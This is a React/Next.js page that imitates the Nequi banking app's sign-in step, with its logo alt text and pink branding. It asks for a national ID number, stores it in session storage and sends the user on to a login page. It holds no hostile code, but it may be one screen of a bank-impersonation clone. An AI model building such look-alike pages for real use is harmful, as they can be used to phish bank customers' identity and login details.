'use client'

import { Button } from "@/components/ui/button"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import Image from "next/image"
import { useRouter } from "next/navigation"
import { useState } from "react"

export default function CedulaPage() {
  const router = useRouter()
  const [cedula, setCedula] = useState('')

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    if (cedula.length >= 8) {
      sessionStorage.setItem('cedula', cedula)
      router.push('/login')
    }
  }

  return (
    <main className="min-h-screen bg-gray-100 p-4">
      <div className="max-w-md mx-auto space-y-4">
        <div className="flex justify-center mb-8">
          <Image
            src="/placeholder.svg?height=48&width=96"
            alt="Nequi Logo"
            width={120}
            height={40}
            priority
          />
        </div>

        <Card>
          <CardHeader>
            <CardTitle>Ingresa tu cédula</CardTitle>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleSubmit} className="space-y-4">
              <div className="space-y-2">
                <Label htmlFor="cedula">Número de cédula</Label>
                <Input
                  id="cedula"
                  type="number"
                  required
                  value={cedula}
                  onChange={(e) => setCedula(e.target.value)}
                  placeholder="Ingresa tu cédula"
                  className="w-full"
                />
              </div>
              <Button 
                type="submit" 
                className="w-full bg-[#E6007E] hover:bg-[#C4006B]"
                disabled={cedula.length < 8}
              >
                Continuar
              </Button>
            </form>
          </CardContent>
        </Card>
      </div>
    </main>
  )
}

